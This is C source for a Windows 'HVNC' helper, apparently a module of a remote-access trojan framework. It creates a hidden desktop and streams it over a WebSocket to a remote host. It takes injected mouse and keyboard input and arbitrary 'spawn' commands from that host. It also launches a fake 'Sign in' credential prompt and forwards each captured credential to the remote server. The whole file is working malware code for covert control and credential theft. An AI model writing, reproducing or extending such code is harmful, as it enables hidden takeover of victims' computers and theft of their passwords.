/* fleet HVNC (Windows hidden-desktop) helper.
 *
 * Creates/opens a private desktop ("FleetHVNC"), launches a shell on it, and
 * streams that desktop as JPEG over the rd WebSocket. Input is injected on the
 * hidden desktop with PostMessage (SendInput only reaches the *input* desktop).
 *
 * It also launches credprompt.exe on the hidden desktop and tails its JSON
 * output, forwarding each captured credential as {"t":"creds",...}.
 *
 * usage: hvnc.exe --host H --port 8443 --session S --token T
 *                 [--desktop FleetHVNC] [--spawn explorer.exe]
 *                 [--creds C:\Windows\Temp\fleet-creds.json]
 *                 [--prompt C:\Windows\Temp\credprompt.exe]
 */
#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../ws.h"

#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "../stb_image_write.h"

typedef struct {
    unsigned char *data;
    size_t len;
    size_t cap;
} membuf;

static void jpg_write(void *ctx, void *data, int size) {
    membuf *b = (membuf *)ctx;
    if (b->len + (size_t)size > b->cap) {
        b->cap = (b->len + (size_t)size) * 2 + 1024;
        b->data = (unsigned char *)realloc(b->data, b->cap);
    }
    memcpy(b->data + b->len, data, (size_t)size);
    b->len += (size_t)size;
}

static char g_desktop[128] = "FleetHVNC";
static char g_spawn[512] = "explorer.exe";
static char g_creds[MAX_PATH] = "";
static char g_prompt[MAX_PATH] = "";
static ws_t g_ws;
static HDESK g_hdesk = NULL;
static int g_w = 0, g_h = 0;
static int g_mx = 0, g_my = 0;
static long g_cred_off = 0;

// collapse accidental double backslashes ("C:\\Users" -> "C:\Users")
static void norm_slashes(char *s) {
    char *w = s;
    for (char *r = s; *r; r++) {
        if (*r == '\\' && r[1] == '\\') {
            *w++ = '\\';
            r++;
        } else {
            *w++ = *r;
        }
    }
    *w = 0;
}

static int json_str_is(const char *s, const char *key, const char *value) {
    const char *p = strstr(s, key);
    if (!p) return 0;
    p += strlen(key);
    while (*p == ' ' || *p == ':' || *p == '\t') p++;
    if (*p != '"') return 0;
    p++;
    size_t n = strlen(value);
    return strncmp(p, value, n) == 0 && p[n] == '"';
}

static int json_num(const char *s, const char *key, double *out) {
    const char *p = strstr(s, key);
    if (!p) return 0;
    p += strlen(key);
    while (*p == ' ' || *p == ':' || *p == '"') p++;
    *out = strtod(p, NULL);
    return 1;
}

static void json_str(const char *s, const char *key, char *out, size_t cap) {
    out[0] = 0;
    const char *p = strstr(s, key);
    if (!p) return;
    p += strlen(key);
    while (*p == ' ' || *p == ':' || *p == '\t') p++;
    if (*p != '"') return;
    p++;
    size_t o = 0;
    while (*p && *p != '"' && o + 1 < cap) {
        if (*p == '\\' && p[1]) p++;
        out[o++] = *p++;
    }
    out[o] = 0;
}

static void spawn_on_desktop(const char *cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char desk[MAX_PATH];
    char buf[1024];
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    snprintf(desk, sizeof(desk), "WinSta0\\%s", g_desktop);
    si.lpDesktop = desk;
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    memset(&pi, 0, sizeof(pi));
    if (CreateProcessA(NULL, buf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static void inject_input(const char *msg) {
    double x, y, btn, code, down;
    if (json_str_is(msg, "\"t\"", "m") && json_num(msg, "\"x\"", &x) && json_num(msg, "\"y\"", &y)) {
        g_mx = (int)(x * g_w);
        g_my = (int)(y * g_h);
        POINT pt;
        pt.x = g_mx;
        pt.y = g_my;
        HWND target = WindowFromPoint(pt);
        if (target) {
            PostMessageA(target, WM_MOUSEMOVE, 0, MAKELPARAM(g_mx, g_my));
        }
    } else if (json_str_is(msg, "\"t\"", "b") && json_num(msg, "\"btn\"", &btn)) {
        json_num(msg, "\"down\"", &down);
        POINT pt;
        pt.x = g_mx;
        pt.y = g_my;
        HWND target = WindowFromPoint(pt);
        if (target) {
            UINT m = (btn == 2) ? (down ? WM_RBUTTONDOWN : WM_RBUTTONUP)
                                : (btn == 1) ? (down ? WM_MBUTTONDOWN : WM_MBUTTONUP)
                                             : (down ? WM_LBUTTONDOWN : WM_LBUTTONUP);
            PostMessageA(target, m, (WPARAM)(down ? MK_LBUTTON : 0), MAKELPARAM(g_mx, g_my));
        }
    } else if (json_str_is(msg, "\"t\"", "k") && json_num(msg, "\"code\"", &code)) {
        json_num(msg, "\"down\"", &down);
        HWND fg = GetForegroundWindow();
        if (!fg) fg = GetDesktopWindow();
        UINT m = down != 0 ? WM_KEYDOWN : WM_KEYUP;
        LPARAM lp = down != 0 ? 0x00000001 : (LPARAM)0xC0000001;
        PostMessageA(fg, m, (WPARAM)code, lp);
    } else if (json_str_is(msg, "\"t\"", "spawn")) {
        char cmd[1024];
        json_str(msg, "\"cmd\"", cmd, sizeof(cmd));
        if (cmd[0]) spawn_on_desktop(cmd);
    }
}

static void forward_creds(void) {
    if (!g_creds[0]) return;
    FILE *f = fopen(g_creds, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    if (size <= g_cred_off) {
        if (size < g_cred_off) g_cred_off = 0;
        fclose(f);
        return;
    }
    fseek(f, g_cred_off, SEEK_SET);
    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        size_t n = strlen(line);
        while (n && (line[n - 1] == '\n' || line[n - 1] == '\r')) line[--n] = 0;
        if (n) ws_send(&g_ws, line, n, 1);
    }
    g_cred_off = ftell(f);
    fclose(f);
}

static unsigned char *capture_rgb(void) {
    HWND dw = GetDesktopWindow();
    HDC screen = GetDC(dw);
    if (!screen) return NULL;
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, g_w, g_h);
    HGDIOBJ old = SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, g_w, g_h, screen, 0, 0, SRCCOPY);

    BITMAPINFO bi;
    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = g_w;
    bi.bmiHeader.biHeight = -g_h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    unsigned char *bgra = (unsigned char *)malloc((size_t)g_w * g_h * 4);
    unsigned char *rgb = (unsigned char *)malloc((size_t)g_w * g_h * 3);
    if (bgra && rgb) {
        GetDIBits(mem, bmp, 0, (UINT)g_h, bgra, &bi, DIB_RGB_COLORS);
        for (size_t i = 0, n = (size_t)g_w * g_h; i < n; i++) {
            rgb[i * 3 + 0] = bgra[i * 4 + 2];
            rgb[i * 3 + 1] = bgra[i * 4 + 1];
            rgb[i * 3 + 2] = bgra[i * 4 + 0];
        }
    }
    free(bgra);
    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(dw, screen);
    return rgb;
}

static DWORD WINAPI worker(LPVOID arg) {
    (void)arg;
    SetThreadDesktop(g_hdesk);
    char inbuf[4096];
    for (;;) {
        if (ws_wait(&g_ws, 0) == 1) {
            int op = 0;
            long n = ws_recv(&g_ws, inbuf, sizeof(inbuf) - 1, &op);
            if (n <= 0) break;
            inbuf[n] = 0;
            if (op == 1) inject_input(inbuf);
        }
        forward_creds();

        unsigned char *rgb = capture_rgb();
        if (rgb) {
            membuf mb;
            mb.data = NULL;
            mb.len = 0;
            mb.cap = 0;
            stbi_write_jpg_to_func(jpg_write, &mb, g_w, g_h, 3, rgb, 60);
            free(rgb);
            if (mb.len && ws_send(&g_ws, mb.data, mb.len, 2) != 0) {
                free(mb.data);
                break;
            }
            free(mb.data);
        }
        Sleep(125);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
    (void)inst; (void)prev; (void)cmd; (void)show;
    const char *host = "127.0.0.1";
    const char *session = "session";
    const char *token = "";
    int port = 8443;

    int argc = 0;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argv) {
        for (int i = 1; i < argc; i++) {
            char key[64] = {0}, val[MAX_PATH] = {0};
            WideCharToMultiByte(CP_ACP, 0, argv[i], -1, key, sizeof(key), NULL, NULL);
            if (i + 1 < argc) {
                WideCharToMultiByte(CP_ACP, 0, argv[i + 1], -1, val, sizeof(val), NULL, NULL);
            }
            if (strcmp(key, "--host") == 0) { host = _strdup(val); i++; }
            else if (strcmp(key, "--port") == 0) { port = atoi(val); i++; }
            else if (strcmp(key, "--session") == 0) { session = _strdup(val); i++; }
            else if (strcmp(key, "--token") == 0) { token = _strdup(val); i++; }
            else if (strcmp(key, "--desktop") == 0) { strncpy(g_desktop, val, sizeof(g_desktop) - 1); i++; }
            else if (strcmp(key, "--spawn") == 0) { strncpy(g_spawn, val, sizeof(g_spawn) - 1); i++; }
            else if (strcmp(key, "--creds") == 0) { strncpy(g_creds, val, sizeof(g_creds) - 1); i++; }
            else if (strcmp(key, "--prompt") == 0) { strncpy(g_prompt, val, sizeof(g_prompt) - 1); i++; }
        }
        LocalFree(argv);
    }

    norm_slashes(g_desktop);
    norm_slashes(g_spawn);
    norm_slashes(g_creds);
    norm_slashes(g_prompt);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    srand((unsigned)GetTickCount());

    g_w = GetSystemMetrics(SM_CXSCREEN);
    g_h = GetSystemMetrics(SM_CYSCREEN);
    if (g_w <= 0) g_w = 1024;
    if (g_h <= 0) g_h = 768;

    g_hdesk = CreateDesktopA(g_desktop, NULL, NULL, 0, GENERIC_ALL, NULL);
    if (!g_hdesk) g_hdesk = OpenDesktopA(g_desktop, 0, FALSE, GENERIC_ALL);
    if (!g_hdesk) {
        fprintf(stderr, "hvnc: cannot create/open desktop\n");
        return 1;
    }
    spawn_on_desktop(g_spawn);
    if (g_prompt[0]) {
        char pcmd[1024];
        snprintf(pcmd, sizeof(pcmd), "\"%s\" --out \"%s\" --title \"Sign in\"", g_prompt,
                 g_creds[0] ? g_creds : "fleet-creds.json");
        spawn_on_desktop(pcmd);
    }

    char path[600];
    snprintf(path, sizeof(path), "/rd/%s?token=%s", session, token);
    g_ws.fd = WS_INVALID;
    if (ws_connect(&g_ws, host, port, path) != 0) {
        fprintf(stderr, "hvnc: cannot connect\n");
        return 1;
    }
    DWORD session_id = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
    int hvnc_ok = (session_id != 0);
    char hello[512];
    snprintf(hello, sizeof(hello),
             "{\"t\":\"hello\",\"os\":\"windows\",\"w\":%d,\"h\":%d,\"view_only\":false,"
             "\"mode\":\"hvnc\",\"desktop\":\"%s\",\"caps\":[\"desktop\",\"input\",\"hvnc\"],"
             "\"hvnc\":%s,\"session\":%lu,\"reason\":\"%s\"}",
             g_w, g_h, g_desktop, hvnc_ok ? "true" : "false", (unsigned long)session_id,
             hvnc_ok ? "" : "session 0 (SYSTEM) cannot host a hidden desktop");
    ws_send(&g_ws, hello, strlen(hello), 1);
    if (!hvnc_ok) {
        ws_close(&g_ws);
        WSACleanup();
        return 0;
    }

    HANDLE th = CreateThread(NULL, 0, worker, NULL, 0, NULL);
    if (th) WaitForSingleObject(th, INFINITE);
    ws_close(&g_ws);
    WSACleanup();
    return 0;
}
